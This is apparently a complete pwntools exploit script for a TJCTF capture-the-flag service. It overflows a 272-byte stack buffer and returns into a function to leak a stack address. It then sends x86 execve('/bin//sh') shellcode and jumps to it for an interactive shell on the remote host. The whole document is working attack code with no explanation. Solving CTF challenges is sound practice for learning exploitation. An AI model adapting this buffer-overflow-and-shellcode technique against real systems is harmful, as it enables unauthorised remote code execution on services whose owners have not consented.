from pwn import *

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

sh=remote("p1.tjctf.org",8006)
#sh=process("./service")
exe=ELF("service")

shell="\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"                      
pan=len(shell)

p= 'a'*272 						# padding
p+= p32(exe.sym['get_tree'])	# return to get_tree	
sh.sendline(p)

sh.recvuntil("have the tree ")
leak=sh.recv()[:-23]				# leak address of shellcode
leak=int(tohex(int(leak),32),16)
log.info(hex(leak))

p= shell			# shell code
p+= 'a'*(272-pan) 	# padding
p+= p32(leak+4)		# return to shell code
sh.sendline(p)
sh.interactive()